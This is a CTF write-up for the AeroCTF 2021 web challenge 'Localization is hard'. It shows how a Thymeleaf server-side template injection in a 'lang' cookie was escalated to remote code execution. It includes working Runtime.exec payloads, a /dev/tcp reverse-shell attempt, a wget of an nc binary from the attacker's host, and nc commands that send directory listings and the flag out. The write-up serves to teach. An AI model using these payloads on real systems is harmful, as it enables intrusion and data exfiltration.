+++
title = "[AeroCTF 2021 - web] Localization is hard"
tags = ["ctf", "AeroCTF 2021", "web", "java", "ssti", "Thymeleaf", "2021", "x."]
date = "2021-03-02"
+++

# Localization is hard

## 0x00

To solve this challenge we had to exploit a **[SSTI](https://portswigger.net/research/server-side-template-injection)** on **Thymeleaf** and lead that into a **Remote Code Execution**

## 0x01

#### Discovering the vulnerability

The challenge description talk about a Coffee who made for CTFers and in **English and in Russian**.

![CTF description](https://i.imgur.com/88wE70b.png) 

Btw , the challenge description tell us that the flag should be located at `/` on the file system, this maybe mean that we have to get an access to the machine to read the flag.
 
By inspecting the website we can read that the language can be choosed by clicking on a button. 
`(onclick` event), then the `set_language(lang)` function will be executed

*(quick look into the /js/templatemo-script.js)*

```javascript

function set_language(lang) {
  document.cookie = "lang=" + lang;
  window.location.reload();
}

```

the function set a cookie `lang` with `en` or `ru`

*trying a path traversal   "../flag/"*

```bash

curl http://151.236.114.211:7878/ --cookie "lang=en"

```

![response](https://i.imgur.com/wwxbzN0.png)
"**org.thymeleaf.exceptions.TemplateInputException**" by googling this error message, we find : [**thymeleaf**](https://www.thymeleaf.org/) .
This a modern server-side Java template engine for both web and standalone environments.

## 0x02
#### Find out about this Template-Engine
Assuming **Thymeleaf** as a template engine , we can think about a ***Server-side template injection***.
So searching about SSTI on this template engine
**>>** [https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/](https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/)
**>>** [https://www.veracode.com/blog/secure-development/spring-view-manipulation-vulnerability](https://www.veracode.com/blog/secure-development/spring-view-manipulation-vulnerability)
**>>** [https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#thymeleaf-java](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#thymeleaf-java)

#### Exploitation

To attempt an SSTI in Thymeleaf, we first must understand expressions that appear in Thymeleaf attributes. Thymeleaf expressions can have the following types:

`${...}`: Variable expressions – in practice, these are OGNL or Spring EL expressions.
`*{...}`: Selection expressions – similar to variable expressions but used for specific purposes.
`#{...}`: Message (i18n) expressions – used for internationalization.
`@{...}`: Link (URL) expressions – used to set correct URLs/paths in the application.
`~{...}`: Fragment expressions – they let you reuse parts of templates.


 - `__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::.x`
 - `__${T(java.lang.Runtime).getRuntime().exec("whoami")}__::.x`
 
According [Acunetix](https://www.acunetix.com/). However, as we mentioned before, expressions only work in special Thymeleaf attributes. If it’s necessary to use an expression in a different location in the template, Thymeleaf supports _expression inlining_. To use this feature, you must put an expression within `[[...]]` or `[(...)]` (select one or the other depending on whether you need to escape special symbols). Therefore, a simple SSTI detection payload for Thymeleaf would be `[[${7*7}]]`.

So let's try on the site cookie to check the **RCE**
``__%24%7Bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22id%22).getInputStream()).next()%7D__%3A%3A.x``

![response 500](https://i.imgur.com/4ywvJ38.png)
We don't have the **stdout** in the response but we always have a 500 response.

It's maybe blind based, so let's try to sleep.
![sleep server](https://i.imgur.com/W8J1WHE.png)
It's work !

So now, we understand that :
when we got `org.thymeleaf.exceptions.TemplateInputException` this mean that the command is executed, but when we send a bad command or a non-urlencoded payload we got ``java.lang.IllegalArgumentException``

## 0x03
####  Connect to our machine

We tried firstly to do a simple tcp reverse shell with 
```bash

__%24%7Bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22%2Fbin%2Fsh%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fmyip%2F1337%200%3E%261%22).getInputStream()).next()%7D__%3A%3A.x

```

But nothing...
So let's try to wget a nc binary on our machine 

`__%24%7Bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22wget%20ip/nc%22).getInputStream()).next()%7D__%3A%3A.x`

and now try to bind shell our machine..
![receive connexion](https://i.imgur.com/aburDce.png)
Bingo ! We got a connexion from the machine, but nothing in the output.

#### Getting a shell environment from Runtime.exec

According [code white](https://codewhitesec.blogspot.com/2015/03/sh-or-getting-shell-environment-from.html)
The command passed to `Runtime.exec` is not executed by a shell. Instead, if you dig down though the Java source code, you'll end up in the [_UNIX process class](http://hg.openjdk.java.net/jdk7/jdk7/jdk/file/tip/src/solaris/classes/java/lang/UNIXProcess.java.linux), which reveals that calling `Runtime.exec` results in a `fork` and `exec` call on Unix platforms.

Exemple:
 ```java

import java.io.*;

public class Exec {

		public static void main(String[] args) throws IOException {
				Process p = Runtime.getRuntime().exec(args[0]);
				byte[] b = new byte[1];

				while (p.getErrorStream().read(b) > 0)
					System.out.write(b);

				while (p.getInputStream().read(b) > 0)
					System.out.write(b);
		}

}

```
We call this class as shown below with single quotes around the command line to ensure that our shell passes the command line argument to Java as is:

$ java Exec 'command arg1 arg2 ...'
So let's try to use this to read our flag :
`__%24%7Bnew%20java.util.Scanner%28T%28java.lang.Runtime%29.getRuntime%28%29.exec%28%22sh%20-c%20%24%40%7Csh%20.%20echo%20ls%20-la%20%2F%7C%20nc%20ip%201337%22%29.getInputStream%28%29%29.next%28%29%7D__%3A%3A.x`

**url decoded payload**  ``__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("sh -c $@|sh . echo ls -la /| nc ip 1337").getInputStream()).next()}__::.x``

![ls -la](https://i.imgur.com/IGqCDZC.png)

Now cat the flag :
``__%24%7Bnew%20java.util.Scanner%28T%28java.lang.Runtime%29.getRuntime%28%29.exec%28%22sh%20-c%20%24%40%7Csh%20.%20cat%20%2Ftry_find_me.txt%7C%20nc%20ip%201337%22%29.getInputStream%28%29%29.next%28%29%7D__%3A%3A.x``



![flag](https://i.imgur.com/IxSBfpt.png)

**Aero{j4va_1s_better_th4n_engl1sh}**

Cheers, @0x22sh =) 
